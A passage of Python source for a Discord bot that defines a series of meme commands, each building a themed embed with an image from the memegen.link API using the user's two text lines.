        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="kermit <Text 1> <Text 2>", description="But That's None of My Business")
    async def kermit(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""But That's None of My Business""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/kermit/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="kombucha <Text 1> <Text 2>", description="Kombucha Girl")
    async def kombucha(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Kombucha Girl""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/kombucha/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="leo <Text 1> <Text 2>", description="Leo Strutting")
    async def leo(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Leo Strutting""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/leo/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="live <Text 1> <Text 2>", description="Do It Live!")
    async def live(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Do It Live!""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/live/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ll <Text 1> <Text 2>", description="Laughing Lizard")
    async def ll(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Laughing Lizard""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ll/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="lrv <Text 1> <Text 2>", description="Laundry Room Viking")
    async def lrv(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Laundry Room Viking""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/lrv/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="mb <Text 1> <Text 2>", description="Member Berries meme")
    async def mb(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Member Berries""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/mb/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="michaelscott <Text 1> <Text 2>", description="Michael Scott No God No")
    async def michaelscott(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Michael Scott No God No""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/michael-scott/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="millers <Text 1> <Text 2>", description="You Guys Are Getting Paid?")
    async def millers(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""You Guys Are Getting Paid?""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/millers/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="minikeanu <Text 1> <Text 2>", description="Mini Keanu Reeves")
    async def minikeanu(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Mini Keanu Reeves""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/mini-keanu/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="mmm <Text 1> <Text 2>", description="Minor Mistake Marvin")
    async def mmm(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Minor Mistake Marvin""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/mmm/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="money <Text 1> <Text 2>", description="Shut Up and Take My Money!")
    async def money(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Shut Up and Take My Money!""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/money/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="mordor <Text 1> <Text 2>", description="Mordor meme")
    async def mordor(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""One Does Not Simply Walk into Mordor""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/mordor/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="morpheus <Text 1> <Text 2>", description="Matrix Morpheus meme")
    async def morpheus(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Matrix Morpheus""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/morpheus/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="mw <Text 1> <Text 2>", description="I Guarantee It")
    async def mw(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""I Guarantee It""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/mw/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="nice <Text 1> <Text 2>", description="So I Got That Goin' For Me, Which is Nice")
    async def nice(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""So I Got That Goin' For Me, Which is Nice""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/nice/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="noidea <Text 1> <Text 2>", description="I Have No Idea What I'm Doing")
    async def noidea(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""I Have No Idea What I'm Doing""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/noidea/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ntot <Text 1> <Text 2>", description="No Take, Only Throw")
    async def ntot(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""No Take, Only Throw""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ntot/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="oag <Text 1> <Text 2>", description="Overly Attached Girlfriend")
    async def oag(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Overly Attached Girlfriend""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/oag/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="officespace <Text 1> <Text 2>", description="That Would Be Great")
    async def officespace(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""That Would Be Great""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/officespace/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="older <Text 1> <Text 2>", description="An Older Code Sir, But It Checks Out")
    async def older(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""An Older Code Sir, But It Checks Out""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/older/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="oprah <Text 1> <Text 2>", description="Oprah You Get a Car")
    async def oprah(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Oprah You Get a Car""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/oprah/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="patrick <Text 1> <Text 2>", description="Push it somewhere else Patrick")
    async def patrick(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Push it somewhere else Patrick""",timestamp=embed_timestamp())
